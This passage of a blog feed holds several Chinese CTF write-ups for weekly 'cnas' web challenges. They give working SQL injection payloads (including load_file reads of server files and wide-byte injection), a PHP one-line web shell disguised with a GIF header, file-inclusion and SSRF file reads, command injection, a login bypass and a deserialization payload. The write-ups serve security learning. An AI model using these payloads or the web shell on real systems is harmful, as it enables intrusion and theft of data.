<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%091%23 		返回正常</span><br><span class="line"></span><br><span class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%092%23		返回正常</span><br><span class="line"></span><br><span class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%093%23		返回异常</span><br></pre></td></tr></table></figure>
<p>得到字段数为2</p>
<p>提示key在/tmp/360/key中</p>
<p>然后用load_file()函数读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?id=0%27%29%09union%09select%091,load_file(&apos;/tmp/360/key&apos;)%23</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/week06_02.png" alt=""></p>
<p>由于数据读取的问题，把id的值改为不存在的值即可读到key</p>
<h2><span id="文件上传-10">文件上传 10</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28003/03.php" target="_blank" rel="noopener">http://47.100.121.220:28003/03.php</a></p>
<h3><span id="解答">解答</span></h3><p>这个上传题是检验文件头的，所以直接在php文件加上图片的文件头即可上传成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>菜刀连接即可。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/week06_03.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[week 5 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="躲猫猫-50">躲猫猫 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目又是一个文件包含的题目，这里直接用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure>
<p>是读不到源码的，好像是因为这题目的flag并不是在flag.php文件里，flag.php文件并不存在。</p>
<p>所以我们先用php://input 协议来查看当前目录文件</p>
<p>构造如下payload得到du0maOma0_flag.php文件</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/week05_01_01.png" alt=""></p>
<p>这里可以用cat du0maOma0_flag.php来读文件的，</p>
<p>但是一定要查看源码！查看源码！查看源码！</p>
<p>重要的事情说三遍！</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/week05_01_0.png" alt=""></p>
<p>此时也可以再利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./du0maOma0_flag.php</span><br></pre></td></tr></table></figure>
<p>来读取文件源码</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/week05_01_02.png" alt=""></p>
<p>直接base64解码即可</p>
<h2><span id="02-100">02 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="noopener">http://47.100.121.220:28002</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目我一拿到说就看出来是一个SSRF的题目了，也猜到了代码应该就是</p>
<p><a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">SSRF漏洞的利用与学习</a></p>
<p>我这篇博客里面的第一种没有任何防护的SSRF。</p>
<p>尝试了 利用file协议任意文件读取 是成功的</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/week05_02_01.png" alt=""></p>
<p>然后没有查看help 是一个phpinfo的页面     找到目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB_DOCUMENT_ROOT 	/app</span><br></pre></td></tr></table></figure>
<p>当时就尝试了 如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?url=file:///app/flag.php</span><br></pre></td></tr></table></figure>
<p>但是由于没有去查看源码，就错过了flag，然后一直在纠结利用gopher协议反弹shell</p>
<p>后来在甜哥的提醒下才发现可以直接读出flag的</p>
<p>查看源码就可以了，真的有点尴尬的。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/week05_02_02.png" alt=""></p>
<h2><span id="msg_book-200">msg_book 200</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28003" target="_blank" rel="noopener">http://47.100.121.220:28003</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目是一个注入的题，这里的’被转义了，尝试宽字节注入，是可以的。</p>
<p>这里可以参考我的博客</p>
<p><a href="https://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">宽字节注入漏洞的利用与学习</a></p>
<p>在引号前加一个%df即可，具体原理参考博客</p>
<p>下面基本是利用手注的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;order by 1 #</span><br><span class="line"></span><br><span class="line">msg_id=1%df&apos;order by 2 #</span><br></pre></td></tr></table></figure>
<p>得到字段数为2 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;union select 1,database() #</span><br></pre></td></tr></table></figure>
<p>得到当前数据库：week05_03</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
<p>得到当前数据库的表名：flag,msg_book</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #(flag的十六进制)</span><br></pre></td></tr></table></figure>
<p>这里因为单引号被过滤了，所以要用十六进制</p>
<p>得到列名：flag</p>
<p>最后直接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;union select 1,flag from flag #</span><br></pre></td></tr></table></figure>
<p>发现自己手注的过程还是不熟悉，需要多多练习</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/week05_03_01.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[month 1 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="签到-50">签到 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="noopener">http://47.100.121.220:28001</a></p>
<h3><span id="解答">解答</span></h3><p>这是一个简单的题目，进入页面可以在相应头中找到flag。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%93%8D%E5%BA%94%E5%A4%B4.png" alt=""></p>
<h2><span id="02-100">02 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="noopener">http://47.100.121.220:28002</a></p>
<h3><span id="解答">解答</span></h3><p>这里的提示是 爬虫什么的，最讨厌了！  所以应该是在说robots.txt文件</p>
<p>另外如果不能想到这个，对于我这种脚本小子。拿到题就是用御剑扫起来。</p>
<p>这里我们可以看到一个图片 Disallow: /2333.png</p>
<p>下载之，这里应该是一个隐身之类的，这里就不用bindwalk跑图片了，直接丢进WinHex下，搜索flag</p>
<p>存在flag.pyc文件，</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/pyc.png" alt=""></p>
<p>应该是一个解压包，把.png改成.zip,解压得到flag.pyc</p>
<p>pyc在线反编译，得到python代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"># 访问 http://tool.lu/pyc/ 查看更多信息</span><br><span class="line">print &apos;show me flag&apos;</span><br><span class="line">a = [</span><br><span class="line">    4567249,</span><br><span class="line">    4567259,</span><br><span class="line">    4567254,</span><br><span class="line">    4567248,</span><br><span class="line">    4567244,</span><br><span class="line">    4567169,</span><br><span class="line">    4567183,</span><br><span class="line">    4567252,</span><br><span class="line">    4567175,</span><br><span class="line">    4567171,</span><br><span class="line">    4567250,</span><br><span class="line">    4567169,</span><br><span class="line">    4567174,</span><br><span class="line">    4567170,</span><br><span class="line">    4567183,</span><br><span class="line">    4567253,</span><br><span class="line">    4567183,</span><br><span class="line">    4567183,</span><br><span class="line">    4567182,</span><br><span class="line">    4567250,</span><br><span class="line">    4567170,</span><br><span class="line">    4567168,</span><br><span class="line">    4567252,</span><br><span class="line">    4567170,</span><br><span class="line">    4567173,</span><br><span class="line">    4567172,</span><br><span class="line">    4567183,</span><br><span class="line">    4567172,</span><br><span class="line">    4567252,</span><br><span class="line">    4567171,</span><br><span class="line">    4567251,</span><br><span class="line">    4567169,</span><br><span class="line">    4567182,</span><br><span class="line">    4567173,</span><br><span class="line">    4567168,</span><br><span class="line">    4567183,</span><br><span class="line">    4567175,</span><br><span class="line">    4567183,</span><br><span class="line">    4567173,</span><br><span class="line">    4567174,</span><br><span class="line">    4567183,</span><br><span class="line">    4567251,</span><br><span class="line">    4567249,</span><br><span class="line">    4567170,</span><br><span class="line">    4567251,</span><br><span class="line">    4567242]</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for _ in a:</span><br><span class="line">    flag += chr(_ ^ 4567223)</span><br></pre></td></tr></table></figure>
<p>加个输出 print flag </p>
<p>跑一下，得到flag</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/flagpyc.png" alt=""></p>
<h2><span id="ping-100">ping 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28005/" target="_blank" rel="noopener">http://47.100.121.220:28005/</a></p>
<h3><span id="解答">解答</span></h3><p>拿到题目应该可以看得出来这是一个命令执行的题目。</p>
<p>这里在提交框填什么都会重定向到05.php?ip=127.0.0.1</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E9%87%8D%E5%AE%9A%E5%90%91.png" alt=""></p>
<p>关键在重定向后的这个数据包，这里我们就可以命令执行了</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/pingls.png" alt=""></p>
<p>这里不能直接利用cat flag.php </p>
<p>这里我们利用 \${IFS} 绕过 得到flag</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/IFS.png" alt=""></p>
<p>原本以为是过滤了空格</p>
<p>后面甜哥告诉我是编码的问题 这里不需要利用 \${IFS} 绕过 也可以读取flag的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%20flag.php</span><br></pre></td></tr></table></figure>
<h2><span id="06-100">06 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28006/06.php" target="_blank" rel="noopener">http://47.100.121.220:28006/06.php</a></p>
<h3><span id="解答">解答</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include($_GET[&apos;file&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里我们可以看出这是一个文件包含的题目，在服务器应该存在一个flag.php文件</p>
<p>试图访问/flag.php是存在的，状态为200。</p>
<p>这样我们就可以利用文件包含来读flag.php的代码了</p>
<p>这里直接包含是不行的，要利用php的伪协议 php://filter 来读取</p>
<p>php伪协议可以参考我的博客</p>
<p><a href="https://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p>
<p>直接用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure>
<p>就可以得到base64加密的flag.php源码了,直接解密，得到flag</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/0606060606606.png" alt=""></p>
<h2><span id="07-100">07 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28007/" target="_blank" rel="noopener">http://47.100.121.220:28007/</a></p>
<h3><span id="解答">解答</span></h3><p>打开链接 直接得到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    var $guess;</span><br><span class="line">    var $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if (isset($_GET[&apos;k&apos;])) &#123;</span><br><span class="line">    $k = $_GET[&apos;k&apos;];</span><br><span class="line"></span><br><span class="line">    $o = unserialize($k);</span><br><span class="line"></span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;flag = $flag;</span><br><span class="line">        if ($o-&gt;flag === $o-&gt;guess) &#123;</span><br><span class="line">            echo &quot;Congratulation! &quot;.$o-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;wrong!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;wrong!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>对源码进行分析，可以知道这是一个反序列化的题目，关键的判断在如下代码部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$o-&gt;flag = $flag;</span><br><span class="line">      if ($o-&gt;flag === $o-&gt;guess) &#123;</span><br><span class="line">          echo &quot;Congratulation! &quot;.$o-&gt;flag;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">          echo &quot;wrong!!&quot;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>从代码的理解我们需要做到对象里的flag成员变量的值等于guess的成员变量的值</p>
<p>即 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$o-&gt;flag === $o-&gt;guess</span><br></pre></td></tr></table></figure>
<p>这里我们可以写一个1.php的序列化文件，使我们的类和对象符合题目中的条件，</p>
<p>再利用serialize()函数 序列化得到payload,再把payload赋值给k，由此得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class A &#123;</span><br><span class="line">    var $flag;</span><br><span class="line">    var $guess;</span><br><span class="line">    function A()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag=&amp;$this-&gt;guess;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new A());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/serializetest.png" alt=""></p>
<p>得到paylad</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:5:&quot;guess&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
<p>赋值给k,得到flag</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/unserializectf.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[week 3 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/week-3-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="login-50">login 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="noopener">http://47.100.121.220:28001</a></p>
<h3><span id="解答">解答</span></h3><p>一开始以为这个题是注入题，能从数据库中拿到flag,结果数据库里没有flag。结果群里的大佬说是简单的万能密码。</p>
<p>user=admin’ or 1 #&amp;pass=1 绕过，得到源码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if( isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;])) &#123;</span><br><span class="line">    $user = $_POST[&quot;user&quot;];</span><br><span class="line">    $pass = md5($_POST[&quot;pass&quot;]);</span><br><span class="line">    $auth = false;</span><br><span class="line">    </span><br><span class="line">    $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&quot;Unable to connect!&quot;);</span><br><span class="line">    mysql_select_db($db_name) or die(&quot;Unable to select database!&quot;);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;select user_id from user where user=&apos;$user&apos; and password=&apos;$pass&apos;&quot;;</span><br><span class="line">    $query = mysql_query($sql);</span><br><span class="line">    if(!$query) &#123;</span><br><span class="line">        mysql_close($conn);</span><br><span class="line">        die(&quot;login failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">    if($row[&apos;user_id&apos;]) &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        if(isset($_GET[&apos;data&apos;]))&#123;</span><br><span class="line">            $data = $_GET[&apos;data&apos;];</span><br><span class="line">            if(&apos;php&apos;===$data[&apos;a&apos;] &amp;&amp;</span><br><span class="line">               &apos;is&apos;===$data[&apos;b&apos;] &amp;&amp;</span><br><span class="line">               &apos;nice&apos;===$data[&apos;c&apos;] &amp;&amp;</span><br><span class="line">               &apos;!&apos;===$data[3]) &#123;</span><br><span class="line">                   $auth=true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    mysql_close($conn);</span><br><span class="line">    </span><br><span class="line">    if($auth) &#123;</span><br><span class="line">        echo &quot;login success!&quot;;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die(&quot;login failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>以上代码的关键，还是在data变量数组传入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;data&apos;]))&#123;</span><br><span class="line">    $data = $_GET[&apos;data&apos;];</span><br><span class="line">    if(&apos;php&apos;===$data[&apos;a&apos;] &amp;&amp;</span><br><span class="line">       &apos;is&apos;===$data[&apos;b&apos;] &amp;&amp;</span><br><span class="line">       &apos;nice&apos;===$data[&apos;c&apos;] &amp;&amp;</span><br><span class="line">       &apos;!&apos;===$data[3]) &#123;</span><br><span class="line">           $auth=true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>以上是关键代码，本地做一个简单的测试，看是否能data[a]这样的形式传入参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump( $_POST[&quot;data&quot;]);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r( $_POST[&quot;data&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720171202214639.png" alt=""></p>
<p>这里可以知道我们是可以这样传入参数的，因此构造payload得到flag</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720171202214702.png" alt=""></p>
<h2><span id="where-are-you-from-100">where are you from 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="noopener">http://47.100.121.220:28002</a></p>
<h3><span id="基础知识">基础知识</span></h3><p>Referer</p>
<ul>
<li>包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</li>
</ul>
<p>X-Forwarded-For</p>
<ul>
<li>是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</li>
</ul>
<h3><span id="解答">解答</span></h3><p>这个题目考察的就是HTTP头信息里中的以上两个头部。</p>
<p>在GET包里添加 X-Forwarded-For: 127.0.0.1</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xfx.png" alt=""></p>
<p>这里我们可以得到一个next.php页面，这个地方也要验证的。验证了X-Forwarded-For和Referer，我们把他们同时改为本地地址</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xff-refere.png" alt=""></p>
<h2><span id="日志审计-100">日志审计 100</span></h2>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[week 2 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="火星文-50">火星文 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/" target="_blank" rel="noopener">http://47.100.121.220:28001/</a></p>
<h3><span id="解答">解答</span></h3><p>看到题目就判断为javascript的题目，把火星人A和火星人B的内容复制粘贴到控制台</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E7%81%AB%E6%98%9F%E6%96%87.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E7%81%AB%E6%98%9F%E6%96%872.png" alt=""></p>
<p>A跑出来是一串密文，B跑出来是一个解密脚本</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/base6.png" alt=""></p>
<h2><span id="用户登录-100">用户登录 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002/" target="_blank" rel="noopener">http://47.100.121.220:28002/</a></p>
<h3><span id="基本知识">基本知识</span></h3><p>mysql_query() 函数</p>
<p>mysql_query() 函数执行一条 MySQL 查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(query,connection)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>query</td>
<td style="text-align:center">必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</td>
</tr>
</tbody>
</table>
<p>mysql_fetch_array() 函数</p>
<p>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有<br>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_fetch_array(data,array_type)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>data</td>
<td style="text-align:center">可选。规定要使用的数据指针。该数据指针是 mysql_query() 函数产生的结果。</td>
</tr>
<tr>
<td>array_type</td>
<td style="text-align:center">可选。规定返回哪种结果。可能的值：MYSQL_ASSOC - 关联数组 MYSQL_NUM - 数字数组 MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
</tr>
</tbody>
</table>
<p>strcasecmp() 函数</p>
<p>strcasecmp() 函数比较两个字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcasecmp(string1,string2)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string1</td>
<td style="text-align:center">必需。规定要比较的第一个字符串。</td>
</tr>
<tr>
<td>string2</td>
<td style="text-align:center">必需。规定要比较的第二个字符串。</td>
</tr>
</tbody>
</table>
<p>以上是本题涉及到的几个函数。</p>
